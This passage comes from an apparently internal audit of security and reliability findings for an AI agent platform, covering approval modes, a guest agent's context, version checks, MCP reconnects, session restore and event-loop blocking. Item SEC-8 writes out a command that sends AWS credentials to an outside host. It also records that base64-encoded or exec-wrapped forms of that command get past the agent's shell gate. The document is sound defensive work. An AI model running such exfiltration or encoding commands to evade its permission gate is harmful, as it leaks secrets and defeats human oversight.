- **Sources:** verification_needed:Part3(#17462)

### SEC-16 [30, default, effort S] YOLO stays on after Trust/Reads; config-set YOLO re-arms on restart (both deliberate) — PARTLY
- **Original claim:** YOLO toggle silently re-enables itself (corrected below)
- **Verified claim:** There is no scope mismatch with agent.yolo_duration. All ad-hoc grants use one duration, and POST /api/chat/mode's `normal` deactivates the process-global override at any scope. Two code paths do make YOLO come back or stay on after a user 'turned it off', and both are deliberate and documented in code but not recorded in docs/decisions. (1) From the dashboard picker, choosing Trust or Reads on the current slot is a slot-scoped `trust`/`trust_reads`. It deliberately does NOT deactivate an ad-hoc YOLO grant, and the picker keeps displaying YOLO because slotApprovalMode returns 'yolo' whenever approvalMode === 'yolo'. Only `normal` ends it. (2) A grant declared in config (`agent.dangerously_skip_permissions` / `dangerouslySkipPermissions` / `yolo`, config-file-only, restart=True) is cleared by any picker change in memory only. _apply_startup_yolo re-establishes it on every gateway start, so YOLO re-enables itself after a restart. The reporter's exact repro (#17097) needs a live dashboard.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/chat_handlers.py:9587-9623 — 'A slot-scoped trust/trust_reads therefore leaves the grant alone ... `normal` remains the off-switch'; `if not request_app and not cron_creator and mode != "yolo" and (not slot_scoped_trust or safety_override().is_declared): deactivate`
  - website/src/utils/slotApprovalMode.ts:10-18 — `if (approvalMode === 'yolo') return 'yolo'` before slot trust
  - website/src/components/ApprovalModePicker.tsx:196-198 — pick() always dispatches `changeApprovalMode({ mode: m, slot: slotKey })` (slot-scoped)
  - src/kiro_crew/dashboard/server_runtime/safety_grants.py:46-81 _apply_startup_yolo — 'the grant is re-established and re-audited on every startup ... Picking another approval mode still clears it immediately'
  - src/kiro_crew/config/sections.py:1128-1140 dangerously_skip_permissions — 'standing instruction ... re-established on every startup ... config-file-only'; :1141-1152 yolo_duration applies to ad-hoc grants only
  - docs/decisions/: no entry on approval-mode / YOLO picker semantics
- **Checked by:** read
- **Required outcome:** A user who steps down from YOLO in the dashboard picker ends up with YOLO off, or is told explicitly that it is still on and why. A declared config grant that will re-arm at restart is visible in the picker, so 'off' never silently becomes 'on' again. Which picker actions end the global grant is a product decision that should be recorded in docs/decisions.
- **Solution:**
  1. Record the decision (docs/decisions): does picking Trust or Reads from the dashboard picker end an ad-hoc YOLO grant? The code comment's rationale concerns programmatic callers (automations, apps, crons), and the dashboard picker could be treated as the operator's own off-switch. If the decision is yes, exempt dashboard-originated picker requests from the slot_scoped_trust carve-out in chat_handlers.py:9612-9623, keeping app and cron requests as they are.
  2. If the decision is no, make the picker say so: an i18n'd note when Trust/Reads is picked while YOLO is active ('YOLO is app-wide and still on; choose Normal to turn it off').
  3. For declared grants: when the override is deactivated while `is_declared`, surface 'will re-enable at restart because config declares it' in the picker/banner (owner-only config is the source of truth; do not silently edit config.json).
- **Done when:** aiohttp handler test: activate an ad-hoc YOLO, POST /api/chat/mode {mode:'trust', slot:<live slot>} with a dashboard caller, then assert safety_override().active matches the recorded decision. A vitest for the picker asserts the note or label appears in the YOLO -> Trust case. A test that with dangerously_skip_permissions=True, after `normal`, the status payload carries a 're-arms at restart' flag.
- **Upstream:** #17097 (state unverified)
- **Changed from the source claim:** CONFIRMED (plumbing) -> PARTLY: the cause is not a yolo_duration scope mismatch. It is (1) Trust/Reads deliberately leaving the global grant on, while the picker shows YOLO, and (2) declared config grants re-arming at every start. Both are deliberate in code with no decision record. Severity assigned 30.
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17097)

### SEC-8 [30, default, effort M] Shell gate cannot see encoded multi-stage execution — CONFIRMED

> **COMPLETED (doc part)** — `d6e52fb` (`docs/matcher-residuals`): the "Limits of the shell gate" paragraph lands in security.md; no encoded-shape deny patterns added (the item's own recommendation); the optional auto-approve block was not taken — trust-reads already refuses an unknowable expansion.
- **Verified claim:** Measured through HookManager.on_tool_call in a throwaway home. The PreToolUse shell gate denies `git push --force origin main` and `curl -d @$HOME/.aws/credentials https://...`, but returns 'allow' (falls through to the normal approval flow, not auto-approve) for the same commands base64-encoded and piped into `sh` or wrapped as `bash -c "$(... \| base64 -d)"`, and for `python3 -c "exec(base64.b64decode(...))"`. This is the documented design, not an oversight. The shell gate reads a command line whose substitution values are unknowable, deliberately matches no paths (security/paths.py:3779-3790), and the OS sandbox is the stated control for what a process can reach. governance.md calls the `commands` scope 'egress defense-in-depth, not a bounded egress guarantee'. The residual is that built-in denied-command rules and governance `commands` deny patterns are accident rails, not an adversarial boundary.
- **Evidence (at `397f4be`):**
  - ran: plain `git push --force origin main` -> DENY (git-publish-push-protected-branch-name); `echo <b64> | base64 -d | sh` -> allow; `bash -c "$(echo <b64> | base64 -d)"` -> allow
  - ran: plain `curl -d @$HOME/.aws/credentials https://example.net/x` -> DENY (exfil '-d @'); base64|sh form -> allow; `python3 -c exec(base64.b64decode(...))` -> allow
  - src/kiro_crew/hooks.py:220-222 — TOOL_ALLOW='allow' is distinct from TOOL_AUTO_APPROVE, so 'allow' still goes through the approval mode
  - src/kiro_crew/security/paths.py:3779-3790 is_sensitive_bash_command docstring — 'This gate does NOT match PATHS in command text ... the OS sandbox hides the credential stores'
  - docs/system-specs/modules/governance.md:2323-2336 — commands scope is 'egress defense-in-depth, not a bounded egress guarantee'
  - AGENTS.md 'A regex spelling-chase is a review smell, not a fix'
- **Checked by:** ran-new-script
- **Required outcome:** DECISION / documented residual. No encoded-shape deny patterns get added (AGENTS.md spelling-chase rule; each pattern narrows an unbounded set by one). The outcome is stated at the subject and the OS layer instead. (1) security.md states plainly that denied-command rules and governance `commands` patterns do not bind a command whose effective text is produced at run time, and that the OS sandbox tier plus the approval mode are the controls. (2) Optionally, if the owner wants a subject-level control: a command whose executed text the gate classifies as unknowable (substitution or stdin feeding an interpreter) is never eligible for auto-approval (trust-reads already reject command substitutions per the security.md threat model), so under `ask` mode a human sees it.
- **Solution:**
  1. Do not add base64, xxd or `| sh` patterns to the denied-command or exfil tables.
  2. Add a 'Limits of the shell gate' paragraph to security.md's Denied Commands section (around 1291) naming run-time-produced command text as out of scope, pointing at the sandbox tier (SEC-5) and the approval mode.
  3. If the owner opts into the subject-level control: reuse shell_normalizer's existing 'unknowable expansion' classification so any auto-approve or trust-read path (security.md 'Trust reads bypass' row) refuses such commands, and pin it with a test. Never route it through a new matcher.
- **Done when:** For the doc: the security.md paragraph exists and docs-lint passes. For the optional control: a test asserting that under an auto-approve rule matching `bash`, `bash -c "$(echo x \| base64 -d)"` is not auto-approved (it reaches 'allow' -> approval prompt), while a literal `ls` still auto-approves.
- **Changed from the source claim:** Verified by running the gate (the source was [VERIFY]). Reframed from the source fix ('deny encoded-stdin shapes') to a documented residual with an optional subject-level control, per AGENTS.md. Severity assigned 30 (the denied rules are accident rails; the approval mode still applies unless the operator auto-approves or runs yolo).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:V-4

### REL-37 [30, armed, effort M] Broker-stub MCP bridge retries ~10 min; then that server's tools are gone until restart — PARTLY
- **Original claim:** A dead stdio MCP bridge kills a session's tools permanently (corrected below)
- **Verified claim:** Mitigated, not closed. When the gateway connection behind a stdio MCP stub dies, the stub (mcp_gateway/stub.py) now keeps kiro-cli's stdio open and RECONNECTS, replaying the cached initialize, for a bounded budget sized to outlast a supervisor respawn cycle (~10 min, ping 30 s x 3 misses + shutdown budget + 60 s backoff); queued requests are replayed in order. If the budget runs out it takes a terminal exit, answering outstanding ids with errors ('past ten minutes the honest signal to a waiting session is that its tools are gone'), and nothing in Crew re-runs MCP discovery or recycles the session afterwards, so from then on the session runs without that server's tools until it is restarted. Scope: only servers that run behind a stub (MCP broker on).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_gateway/stub.py:1-19 — stub bridges kiro-cli stdio <-> gateway; 'Bridge phase is NOT wrapped in a timeout'
  - src/kiro_crew/mcp_gateway/stub.py:153-176 — reconnect budget: 'a gateway that is gone for good must eventually reach the terminal exit ... past ten minutes the honest signal to a waiting session is that its tools are gone'; _SUPERVISOR_LIVENESS_PING_INTERVAL_SECS = 30.0, MAX_FAILURES = 3, RESPAWN_B…
  - src/kiro_crew/mcp_gateway/stub.py:1115-1152 — connection state kept across reconnects (initialize result, stdin reader); `self.reconnects`
  - src/kiro_crew/mcp_gateway/stub.py:1243-1250 take_pending_request_ids — 'when the reconnect gives up there is no next bridge'
  - rg 'rediscover|notifications/tools/list_changed' in src: no Crew-side rediscovery/recycle after a server is lost
- **Checked by:** read
- **Required outcome:** A session whose MCP server is lost for good is told so and recovered: Crew either respawns the server path and re-runs discovery (tools/list) for that session, or recycles the session (preserving the conversation) so the next turn has the tools again, instead of running on without them.
- **Solution:**
  1. On the stub's terminal exit (stub.py terminal path), emit a structured record the gateway can read (it already writes stub_fallback.jsonl for handshake failures) naming the session and server.
  2. In the gateway, on that record (or on kiro-cli's `_kiro.dev/mcp/server_init_failure` / server-exit notice), flag the session for recycle at its next acquire (the identity sweep's retire_on_identity_change pattern) so session/load restores the conversation with fresh MCP servers.
  3. Surface a user-visible notice 'MCP server X was lost; tools restored on next turn'.
  4. Document in docs/architecture/mcp.md.
- **Done when:** Test: simulate the stub terminal-exit record for (session S, server X); assert S is flagged for recycle and the next acquire spawns a fresh provider (provider factory called once) while the session map keeps S's conversation id.
- **Upstream:** #15230 (state unverified)
- **Changed from the source claim:** HEAD reconnects within a ~10 min budget (the claim's 'never re-runs' now applies only after that budget); stub-only scope.
- **Sources:** verify_needed:G40(#15230)

### SEC-22 [30, armed, effort S] Guest (non-operator) agent receives operator's global steering — CONFIRMED

> **COMPLETED** — decided (delegated): keep the current guest-steering behaviour; removing it is a take-away change needing a maintainer `docs/decisions` entry, which was not taken. Flip = skip inherited resources for `kirocrew-guest` in `skill_projection.py:3023-3031`.
- **Verified claim:** Re-ran the existing SPEC-4 measurement. With workspace inheritance at its default (cli.json `kirocrew.skillDiscovery.inheritFiles: True`, `inheritSource: global`), prepare_native_skill_projection appends `file://<kiro_home>/steering/**/*.md`, `file://.kiro/steering/**/*.md` and `file://AGENTS.md` to EVERY agent view. That includes kirocrew-guest, which carries 3 resources matching 33,973 B of seeded steering. kirocrew-guest is the tool-less agent a NON-operator channel sender talks to ('a trust boundary that mounts nothing'). It has no tools, but the operator's global steering (the absolute ~/.kiro/steering glob) sits in its context, where an admitted non-operator can ask about it.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/acp/skill_projection.py:3023-3031 — `if inherited: for view in specs.values(): for resource in (f"file://{kiro_home().as_posix()}/steering/**/*.md", "file://.kiro/steering/**/*.md", "file://AGENTS.md")`
  - src/kiro_crew/agent_materialization/service_agents.py:1-8, 20-45 — kirocrew-guest is 'the tool-less agent a non-operator channel sender talks to, a trust boundary that mounts nothing'
  - src/kiro_crew/messaging/dispatch.py:115-125 TOOLLESS_TURN_AGENT = 'kirocrew-guest'
  - ran (existing script): kirocrew-guest view_prompt=368, n_res=3, files=3, res_bytes=33973; all 26 views identical resource bytes; cli.json inheritFiles True
- **Checked by:** ran-existing-script
- **Required outcome:** DECISION NEEDED (security owner), per FIX_PLAN's note not to change it under SPEC-4: whether the non-operator guest agent may carry the operator's steering. The recommended direction, for the owner to accept or reject: the guest view carries no inherited steering or AGENTS.md, because steering is operator-authored instruction content and the guest is defined as a trust boundary. If accepted it is a take-away change for operators who relied on steering to shape guest answers, and needs a decisions entry.
- **Solution:**
  1. Raise with the security owner (not a token item; separate from SPEC-4).
  2. If accepted: in acp/skill_projection.py:3023-3031, skip the inherited-resource append for a Crew-side set naming the guest (the same mechanism SPEC-4 proposes for internal agents; it cannot be a spec key because of deny_unknown_fields). Keep _project_steering_delivered / inherits_default_resources consistent and mind _is_legacy_projected_view.
  3. Update messaging.md (guest boundary) and the agent-spec docs in the same commit.
- **Done when:** With a seeded ~/.kiro/steering file, the materialized kirocrew-guest view carries no `steering` or `AGENTS.md` resource, while `kirocrew` and a user custom agent still do (extend scratch views.py into a unit test with a tmp home).
- **Changed from the source claim:** Security impact assessed (the source had measurement only). Scope armed: needs an operator who admits non-operator senders and has global steering. Severity assigned 30.
- **Second reader:** security-rules check: agreed.
- **Sources:** FIX_PLAN:SPEC-4/guest-steering-note

### SEC-4 [30, armed, effort S] meets_min_version: '0.3.0-rc.1' passes a 0.3.0 floor; PEP 440 '0.3.0rc1' fails every floor — PARTLY

> **COMPLETED** — fixed on `main` in `3c28069` (`fix/version-floor-comparator`): one shared comparator (`kiro_crew.versioning`) for the floor and the update check; a prerelease of X.Y.Z is below an X.Y.Z floor; floor intersection ordered the same way; `_version_tuple` deleted; governance.md updated in-commit.
- **Original claim:** Pre-release build satisfies the min_version floor (corrected below)
- **Verified claim:** UpdatePins.meets_min_version uses _version_tuple, which splits off everything after the first '-' or '+' and int()s the dotted core. Two opposite errors follow, depending on how the build is stamped. (a) As claimed: the semver-hyphenated stamps from the desktop and Windows lanes (`0.3.0-nightly.20260708t061155`, `0.3.0-rc.1`, `0.3.0-rc1`) compare equal to `0.3.0` and satisfy a `min_version: 0.3.0` floor. (b) Not in the claim: the PEP 440 stamps the CLI-wheel lane writes into __version__ (`0.3.0rc1`, `0.3.0.dev20260708061155`, and promoted stable bytes carrying `X.Y.ZrcN`) do not parse. _version_tuple returns (), so meets_min_version is False against ANY floor (`0.9.0rc1` vs floor `0.2.0` -> False). update_required() therefore reports every pip-installed insider or nightly host as below the floor whenever a floor is pinned. A correct PEP 440 + semver-suffix comparator already exists in dashboard/handlers/updates.py (_version_key / _is_newer).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/platform/governance.py:1640-1653 _version_tuple — `core = re.split(r"[-+]", ..., maxsplit=1)[0]`; ValueError -> ()
  - src/kiro_crew/platform/governance.py:1717-1731 meets_min_version — `if not current: return False`; zero-padded tuple compare
  - src/kiro_crew/platform/update_governance.py:747 — `return not active_update_pins().meets_min_version(current_version)`
  - ran: meets_min_version('0.3.0-nightly.20260728t184500', floor 0.3.0)=True; '0.3.0-rc.1'=True; '0.3.0-rc1'=True
  - ran: meets_min_version('0.3.0rc1', 0.3.0)=False; ('0.9.0rc1', 0.2.0)=False; ('0.3.0.dev20260708061155', 0.3.0)=False — _version_tuple returns ()
  - docs/build/release.md:598-602 — CLI wheel stamps are PEP 440 (`0.2.0rc1`, `0.2.0.dev20260708061155`); desktop/semver stamps `0.2.0-rc.1`, `0.2.0-nightly.*`
  - .github/workflows/build-wheel.yml:59 — `sed ... __version__ = "${WHEEL_VERSION}"` (the PEP 440 stamp reaches __version__)
  - docs/build/release.md:604-607 — STABLE_PROMOTE_BYTES keeps the candidate's `rcN` stamp on stable bytes
  - …and 2 more in the verification results.
- **Checked by:** ran-new-script
- **Required outcome:** The governance floor orders versions the same way the update check does. A prerelease or dev build of X.Y.Z (any lane's spelling) is below an X.Y.Z floor and at or above any lower floor. A version that cannot be parsed stays below the floor, and an unparseable floor still imposes none. There is one comparator for both the floor and the update check. The STABLE_PROMOTE_BYTES case (stable bytes that report `X.Y.ZrcN`) is decided explicitly and documented.
- **Solution:**
  1. Move _version_key / _is_newer out of dashboard/handlers/updates.py (617-705) into a dependency-free shared module (e.g. kiro_crew/versioning.py); governance must not import a dashboard handler. Re-export them from updates.py so existing imports and tests keep working.
  2. Rewrite UpdatePins.meets_min_version (governance.py:1717-1731) as `not _is_newer(floor, current)`. Treat None from an unparseable current as below the floor (unchanged) and an unparseable floor as no floor (unchanged).
  3. Delete _version_tuple (1640-1653) if nothing else uses it (grep first).
  4. Decide how STABLE_PROMOTE_BYTES hosts are handled (release.md:604-607): their `X.Y.ZrcN` stamp now sorts below an `X.Y.Z` floor, so a fleet that promoted bytes and pinned that floor would see update_required() with nothing newer to take. Record the choice in governance.md's `min_version` bullet (252-275). That paragraph also needs the prerelease ordering stated.
  5. Do not add `packaging` as a dependency for this.
- **Done when:** Parametrised unit test on UpdatePins(min_version=F).meets_min_version(V): ('0.3.0-nightly.20260728t184500','0.3.0')->False, ('0.3.0-rc.1','0.3.0')->False, ('0.3.0rc1','0.3.0')->False, ('0.3.0.dev20260708061155','0.3.0')->False, ('0.9.0rc1','0.2.0')->True, ('0.3.1-nightly.1','0.3.0')->True, ('0.3.0','0.3.0')->True, ('garbage','0.3.0')->False, ('0.3.0','not-a-version')->True. A further test asserts the floor and updates._is_newer agree on the same table.
- **Changed from the source claim:** Verdict PARTLY: the claim holds for the hyphenated desktop/Windows stamps but misses the opposite failure. Every PEP 440 CLI-wheel prerelease or dev stamp (and promoted-bytes stable) is read as unparseable and therefore below ANY floor. Fix corrected: reuse the existing updates._version_key comparator rather than `packaging.version`, which is not a dependency. Severity unchanged at 30 (armed: needs a pinned min_version). Line numbers unchanged.
- **Second reader:** security-rules check: agreed.
- **Sources:** FIX_PLAN:SEC-4, REVIEW_FINDINGS:Part1#7

### REL-46 [30, default (needs one pinned or foldered transcript with a malformed field; metadata lines are agent-writable), effort S] _apply_recent_session has no rollback: a bad title/tab_id aborts the restore loop — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 9f8b81c86 (chat_persistence.py): `_apply_recent_session` now has `except BaseException` rollback (chat_persistence.py:1689-1693); both restore loops wrap each session in try/except (:1729-1745, :1869-1885) with the REL-46 comment   Per-session skip and rollbac…
- **Original claim:** Dashboard slot restore has no rollback on a malformed field (corrected below)
- **Verified claim:** The startup recent-sessions restore (_apply_recent_session, chat_persistence.py:1573-1680) has no rollback and no per-session catch. It restores pinned or foldered sessions by default, and every recent one when dashboard.restore_sessions is on. A non-string metadata `title` raises after get_or_create_slot (:1625), leaving an empty half-built slot registered, and aborts the whole loop. An unhashable `tab_id` raises inside get_or_create_slot (no slot registered) and also aborts the loop. Every session after the bad one in list_sessions order is not restored (it sorted last in my run; if it sorts first, none restore). The exception is uncaught through start_dashboard (server.py:2236) and GatewayOrchestrator.run (slack/gateway.py:12857-13005 has only local RuntimeError trys), so gateway startup fails while that transcript stays pinned or foldered. No construction mark is involved: the resume and import paths do roll back their mark.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/chat_persistence.py:1338-1357 — `except BaseException: # Undo what THIS call added. ... state._slots.pop(slot_name, None) ... state._restricted_keys.discard(restricted_key); raise`
  - src/kiro_crew/dashboard/chat_persistence.py:533-540 — restore_open_slots: rehydrate failure -> `unrestored.add(key)`; 'No rollback here: _rehydrate_slot_from_history undoes its own partial slot and restricted key'
  - src/kiro_crew/dashboard/chat_api/resume.py:516 `state.begin_slot_construction(slot.key)`; :535-546 `except BaseException: if slot is not None: state.end_slot_construction(slot.key); state._slots.pop(slot.key, None); state._restricted_keys.discard(...); raise`
  - src/kiro_crew/dashboard/session_transfer.py:2742-2747 — `finally: state.end_slot_construction(slot.key)` ('Every exit releases the construction count')
  - src/kiro_crew/dashboard/chat_handlers.py:508-517 — begin_slot_construction inside try/finally end_slot_construction
  - second reader: The construction-mark half and the open-tab and resume paths roll back as the verifier says (chat_persistence.py:1338-1357; resume.py:535-546; open-slot loop catches per key at chat_persistence.py:533-540). But the recent-sessions startup restore has no rollback: _apply_recent_sessio…
- **Checked by:** read
- **Required outcome:** One malformed transcript never aborts the startup restore and never leaves a half-built slot: the bad session is skipped (or restored with defaults) and every other session still restores, as the open-tab path already does.
- **Solution:**
  1. Read docs/system-specs/modules/session.md and history.md (dashboard restore) first.
  2. In chat_persistence._apply_recent_session, wrap everything after get_or_create_slot in try/except BaseException that pops the slot and discards the restricted key it added (mirror _rehydrate_slot_from_history, :1338-1357), then re-raise.
  3. In both loops (_restore_recent_sessions_steps :1714 and restore_recent_sessions_async :1848), catch Exception per session, log it, and continue, as restore_open_slots does at :533-540.
  4. Optional: make _read_title coerce a non-string listing or meta title to the slot name, as the Resume purpose already does with isinstance.
- **Done when:** A test writes three pinned transcripts, one with metadata title=123 and one with tab_id={}. restore_recent_sessions_async(state, 0, folders_only=True) returns 2 without raising, state._slots holds exactly the two good keys, and the restricted keys are unchanged. The same holds for restore_recent_sessions.
- **Upstream:** #17026 (state unverified)
- **Changed from the source claim:** Prior 'verified-present' does not hold at HEAD: rollback and construction-mark release exist on every restore path read (no commit history available to date the fix).
- **Second reader:** disagreed with NOT_CONFIRMED and set PARTLY: The construction-mark half and the open-tab and resume paths roll back as the verifier says (chat_persistence.py:1338-1357; resume.py:535-546; open-slot loop catches per key at chat_persistence.py:533-540). But the recent-sessions startup restore has no rollback: _apply_recent_session registers the slot (chat_persistence.py:1625) and then applies metadata (:1629) outside any try. A non-string `title` raises TypeError in _rehydrate_slot_title (metadata_codec.py:530 -> :235). Callers at :1714 and :1848 do not catch it. Measured with restore_recent_sessions_async(state, 0, folders_only=True), which is the default (restore_sessions=False): a pinned session with title 123 raised TypeError and left an empty half-built slot chat-1-1 (0 messages) registered. By reading, the exception escapes _restore_dashboard_sessions (session_restore.py:44), start_dashboard (server.py:2236) and _init_dashboard (slack/gateway.py:10673, :13005) with no handler. A dict `tab_id` also aborts the same loop, raising inside get_or_create_slot before registration. No wrapping try in GatewayOrchestrator.run (slack/gateway.py:12857-13005).
- **Sources:** verification_needed:Part3(#17026)

### REL-10 [25, default, effort L] Oversized frontend files — CONFIRMED
- **Verified claim:** Measured at HEAD: ChatSidebar.tsx 6,929 lines, ChatPage.tsx 6,713, DrivePage.tsx 4,778, MembersPage.tsx 4,520 (22,940 total). These are the four largest non-test source files in website/src. 128 non-test .ts/.tsx files exceed 800 lines. The ~800-line target is the reviewer's recommendation, not a repo rule: no max-lines lint or size rule exists in code-style.md or website/docs.
- **Evidence (at `397f4be`):**
  - wc -l: website/src/pages/ChatSidebar.tsx 6929; website/src/pages/ChatPage.tsx 6713; website/src/apps/aws-control/DrivePage.tsx 4778; website/src/pages/members/MembersPage.tsx 4520
  - find website/src -name '*.ts*' (excluding test/ and *.test.*) | wc -l > 800 lines: 128 files
  - grep code-style.md, website/docs/frontend-conventions.md, website eslint config: no max-lines rule
- **Checked by:** ran-new-script (inline wc -l / find)
- **Required outcome:** The four files are split along feature boundaries into reviewable modules without behaviour change, one extraction per PR. Whether to adopt a size budget repo-wide is a maintainer decision, not part of this item.
- **Solution:**
  1. Read website/AGENTS.md and frontend-conventions.md.
  2. For each file, extract data and effects into hooks (for example the session list and filter state in ChatSidebar) and each panel or section into its own component file. Move the matching tests alongside (DrivePage.test.tsx 5,090 and MembersPage.test.tsx 4,918 lines are as large).
  3. One extraction per PR, so the jscpd pretest and the full vitest suite prove no behaviour change.
  4. Optionally propose a max-lines lint at warn level to the maintainers. That is a decision, not part of the split.
- **Done when:** After each extraction PR, `cd website && npm run build && npm run test` is green with no changed snapshots, and the touched file's `wc -l` drops. The item is done when all four files are at or under the agreed budget.
- **Changed from the source claim:** Counts confirmed exactly (the source gave ~6.9k/6.7k/4.8k/4.5k). Added: 128 non-test files over 800 lines, and no repo rule sets the threshold. Severity 30 -> 25 (maintainability only).
- **Sources:** FIX_PLAN:REL-10, REVIEW_FINDINGS:Part1#9

### REL-19 [25, default, effort S] All seven mcp-* servers import numpy; per-core OpenBLAS cost is Linux-only, unmeasured — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): dc1ada450: knowledge/retrieval.py numpy import deferred to first search (`_numpy_available` at :22-34 and call-time imports). grep finds no top-level numpy import under src/kiro_crew/knowledge, mcp_*.py or platform/   Import chain not executed (deps missing in…
- **Original claim:** Every mcp-* server imports numpy and starts a per-core OpenBLAS pool (corrected below)
- **Verified claim:** Every mcp-* server module imports numpy at startup: mcp_core imports kiro_crew.knowledge.retrieval at module top (which does `try: import numpy as np`), and mcp_cron, mcp_work, mcp_crew_log, mcp_panel and mcp_computer all end up with numpy loaded through the same chain; mcp_dashboard additionally loads it via stt.engine and stt.vad (unconditional `import numpy as np`). The import is confirmed on this host. The cost claim (a per-core OpenBLAS thread pool, ~7.5 CPU-s per server start) is specific to numpy wheels linked against OpenBLAS (Linux); on this macOS host numpy uses Accelerate, the whole server import costs ~0.4 CPU-s with numpy ~21 ms and no extra threads, so the CPU figure was not reproducible here.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_core.py:49-52 — top-level `from kiro_crew.knowledge.retrieval import HybridRetriever, vector_leg` (+ dedup, embedder, store)
  - src/kiro_crew/knowledge/retrieval.py:17-19 — module-top `try: import numpy as np`
  - src/kiro_crew/stt/engine.py:55 and src/kiro_crew/stt/vad.py:28 — `import numpy as np` at module top
  - src/kiro_crew/cli.py:3500-3511 — mcp-core imports kiro_crew.mcp_core; mcp-dashboard importlib.import_module('kiro_crew.mcp_dashboard')
  - ran rel19_numpy.py (fresh interpreter per server, import kiro_crew.cli + server module): numpy loaded for mcp_core, mcp_dashboard (holders: knowledge.retrieval, stt.engine, stt.vad), mcp_cron, mcp_work, mcp_crew_log, mcp_panel, mcp_computer; cpu_s 0.40-0.56, threads 1 on darwin; `import kiro_crew.c…
  - -X importtime: numpy cumulative 21256 us under kiro_crew.knowledge.retrieval; numpy.show_config(): blas 'detection method: system' (Accelerate), not OpenBLAS
- **Checked by:** ran-new-script
- **Required outcome:** Starting an mcp-* server process does not import numpy (or any BLAS-backed library) until a tool that needs vector math actually runs, so a host that spawns many servers pays no BLAS thread-pool start-up per server.
- **Solution:**
  1. knowledge/retrieval.py:17-19 — move the numpy import into the functions that use it (vector_leg / the hybrid scorer) behind a cached `_np()` accessor, keeping _HAS_NUMPY as a lazy probe (importlib.util.find_spec).
  2. stt/engine.py:55 and stt/vad.py:28 — import numpy lazily inside the methods, or make mcp_dashboard import the stt modules lazily.
  3. Optionally set OPENBLAS_NUM_THREADS=1 / OMP_NUM_THREADS=1 in the env the gateway gives mcp-* children (acp spawn env) as a belt-and-braces bound.
  4. Add an import-isolation test.
- **Done when:** Test: for each mcp-* server module, a subprocess runs `import kiro_crew.cli, importlib; importlib.import_module(mod)` and asserts 'numpy' not in sys.modules (bounded subprocess timeout).
- **Upstream:** #17038 PR #17058 (state unverified)
- **Changed from the source claim:** Wider than claimed (all seven mcp-* server modules load numpy, not only core/dashboard); the ~7.5 CPU-s / per-core OpenBLAS cost is Linux-wheel specific and unmeasured here — on macOS (Accelerate) the import is ~21 ms with no pool. Live check for the cost: on Linux, `OPENBLAS_VERBOSE=2 python -c 'import kiro_crew.mcp_core'` and compare `/usr/bin/time -v` CPU with OPENBLAS_NUM_THREADS=1.
- **Sources:** verify_needed:G15(#17038), verification_needed:Part3(#17038), verify_needed:G37

### REL-20 [25, default, effort M] Dashboard on_tool_call blocks the loop on path resolution (2 s per target, 12 s/25 s max) — PARTLY
- **Original claim:** Tool-call security gate blocks the event loop on path resolution (corrected below)
- **Verified claim:** Mostly mitigated but not eliminated. The permission-floor gate (permission_floor.refusal_for) is offloaded with asyncio.to_thread at every call site (acp/client.py:12161/:12720, session_handle.py:2193, channel.py:1278, llm_helpers.py:3151, eval/runner.py:512, code_review_sage review_pool.py:649). But the dashboard chat path still calls HookManager.on_tool_call synchronously on the event loop (chat_runner.py:13089; also llm_helpers.py:3173 and task_planner.py:341), and on_tool_call runs sensitive_path_refusal over each non-shell target, which submits a realpath to the bounded mc-pathres child/thread pool and BLOCKS the calling thread waiting for it. The wait is bounded — 2 s per candidate (_PATH_RESOLVE_TIMEOUT_SECS), 8 s for an anchor rebuild, at most 12 s of blocking per 25 s window on the loop thread — so the loop cost is a pool round-trip per target on a healthy disk and up to 12 s per window under a slow/wedged mount, not unbounded gateway-wide latency.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/chat_runner.py:13089 — `tool_result = state.context_builder.hooks.on_tool_call(event.title, ...)` (sync call inside the async turn loop)
  - src/kiro_crew/dashboard/chat_turn/tool_approval.py:195-205 docstring — 'HookManager.on_tool_call, which is synchronous and called ON the loop'
  - src/kiro_crew/hooks.py:1127-1131 — `for target in security_targets: reason = sensitive_path_refusal(target) if target != exempt_command else None`
  - src/kiro_crew/security/paths.py:1426 `_PATH_RESOLVE_TIMEOUT_SECS = 2.0`; :1436 rebuild 8.0; :1437-1443 'successful waits and stalls ... all block the calling thread. Allow 12s total ... leaving 13s of the 25s watchdog'; `_PATH_RESOLVE_WAIT_CAP_SECS = 12.0`, `_PATH_RESOLVE_WAIT_WINDOW_SECS = 25.0`
  - offloaded sites: src/kiro_crew/acp/client.py:12719 `reason = await asyncio.to_thread(permission_floor.refusal_for, ...)`, channel.py:1278, llm_helpers.py:3151, session_handle.py:2193
  - src/kiro_crew/hooks.py:1767-1792 — builtin-app provenance sets are boot-time globals so 'the PreToolUse gate does ZERO filesystem I/O' for that part
- **Checked by:** read
- **Required outcome:** No tool-call gate evaluation blocks the gateway event loop on filesystem path resolution; the dashboard, llm_helpers and task_planner gates run HookManager.on_tool_call off the loop (or the path tier is resolved asynchronously) and the loop thread spends zero time in mc-pathres waits.
- **Solution:**
  1. chat_runner.py:13089 — run `state.context_builder.hooks.on_tool_call(...)` via `await asyncio.to_thread(...)` (or the dedicated gate executor) the same way permission_floor.refusal_for is offloaded at acp/client.py:12719; check that on_tool_call reads no loop-bound state (current_context() snapshot is taken inside).
  2. Same for llm_helpers.py:3173 and task_planner.py:341.
  3. Keep the mc-pathres bound as the worker-side guard; once no loop caller remains, the loop-thread allowance (_PATH_RESOLVE_WAIT_CAP_SECS) can be asserted unused.
  4. Update docs/system-specs/modules/security.md (gate threading) in the same commit; do not change what the gate decides.
- **Done when:** Test: monkeypatch security.paths' resolver submission to record threading.get_ident(); drive a dashboard tool-permission event through the chat_runner gate path inside a running loop and assert the recorded thread id is never the loop thread's; existing hooks/security gate tests unchanged.
- **Upstream:** #17041 PR #17063 (state unverified)
- **Changed from the source claim:** The permission-floor half is already off-loop and the path resolution is bounded (2 s per target, 12 s per 25 s window on the loop); the residual is the dashboard/llm_helpers/task_planner HookManager.on_tool_call calls that still wait on the resolver from the loop thread.
